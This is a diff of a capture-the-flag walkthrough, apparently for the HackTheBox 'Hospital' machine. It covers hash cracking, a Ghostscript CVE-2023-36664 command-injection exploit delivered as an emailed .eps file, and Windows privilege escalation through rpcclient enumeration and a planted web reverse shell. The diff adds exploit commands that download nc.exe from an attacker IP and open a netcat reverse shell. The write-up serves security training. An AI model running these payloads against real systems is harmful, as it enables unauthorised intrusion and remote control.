@@ -307,7 +307,7 @@ Capitalizing on my newfound root status, I seize the opportunity to retrieve Dr.
 `$6$uWBSe***blablablasomerandomstuffs***W192y/:19612:0:99999:7:::`
 
 
-![Alt text](Hos_Pic/image-12.png)
+![](Hos_Pic/image-12.png)
 
 
 and our best friend John gave us the password !
@@ -317,7 +317,7 @@ and our best friend John gave us the password !
 With the password successfully obtained, we can finally return to the website on port 443. Upon logging in, we stumble upon an intriguing email tasking us with designing something in .eps format for viewing by GhostScript.
 
 
-![Alt text](Hos_Pic/image-13.png)
+![](Hos_Pic/image-13.png)
 
 
 ```
@@ -336,7 +336,93 @@ Chris Brown.
 
 *Notice that .eps --> adobe format stand for encapsulated postscript*
 
-Regrettably, despite uncovering potential vulnerabilities in GhostScript, further investigation is required. Although initial findings are promising, I intend to conclude this walkthrough later this week, at which point I will share the subsequent steps.
+After reading the email, it is clear that we need to send him a .eps file. Fortunately, the first GitHub link we found provides a Proof of Concept (PoC) on an exploit that allows us to achieve Remote Code Execution (RCE) that's the **CVE-2023–36664**. \
+To accomplish this, we ensure that the target machine has Netcat installed, so we send it first, and then proceed to use the sent file (Netcat) to execute commands.
+
+
+
+https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git
+
+https://www.youtube.com/watch?v=Gh-A49rqrJI&ab_channel=%C3%81kosJakab
+
+```bash
+python3 CVE_2023_36664_exploit.py --inject --payload "curl http://10.10.14.7/nc.exe -o nc.exe" --filename file.eps
+
+```
+and,
+
+```bash
+python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.7 1234 -e cmd" --filename rv.eps
+
+```
+
+Once this is done, we reply to this email, clicking on the paperclip icon (attachment), selecting the file, and then sending it in return. 
+
+![Send our netcat.exe](image-4.png)
+
+We patiently wait for her to open the email, 
+
+![Process to reply and send our payloads](image-2.png)
+
+and we obtain a reverse shell.
+
+![got revershell as DrBrown](image-5.png)
 
 
 ##  2<sup>nd</sup> Privilege Esclation
+
+
+Upon connection, we notice a batch file containing Dr. Brown's credentials. Although not yet attempted, I assume we can connect using Evil-WinRM and obtain a more stable shell.
+
+![Retrieve DrBrown's password from bat's script](image-7.png)
+
+back to nmap ;\
+We utilize these credentials to enumerate what we can. With nothing significant found in SMB, we pivot towards rpcclient. \
+After several commands yield no fruitful results
+
+```bash
+rpcclient 10.10.11.241 -U "drbrown"
+```
+
+- `tshareenum` --> acces denied \
+- `enum` --> command not found
+- `enumdomains` --> none intersting
+- `enumdomgroups` --> retrieve rid of admin
+- `querygroup` <RID ADMIN> --> some information
+
+
+Next, I discovered the necessary command from this remarkable website.
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------
+
+
+, we then utilize the `querydispinfo` command and notice that Administrator Information is shared with the Guest..
+
+
+![](image-9.png)
+
+Knowing that this machine hosts a web application, we exploit the C drive and gain access to the directory of the web application. \
+Upon using `icacls`, it reveals the permissions of the accounts on this folder.
+
+
+![](image-11.png)
+
+
+
+We know that this machine is running a web application so we exploit C drive and we have the directory of web application. Upon using icacls, it tells us the permission of the accounts on this folder.
+
+
+![](image-13.png)
+
+To locate my reverse shell I used this forum : https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp
+
+We set up a reverse shell, hoping to obtain a connection with elevated privileges, given that we have access.
+
+
+![](image-14.png)
+
+
+
+Box forums provide some guidance, certain hints or questions can be too revealing. Therefore, I'd like to express my gratitude to this particular source that crafted a writeup containing only hints. It proved incredibly helpful during my privilege escalation phase.
+
+
+Thank a lot : https://svadhyayan.com/htb-hospital-writeup/
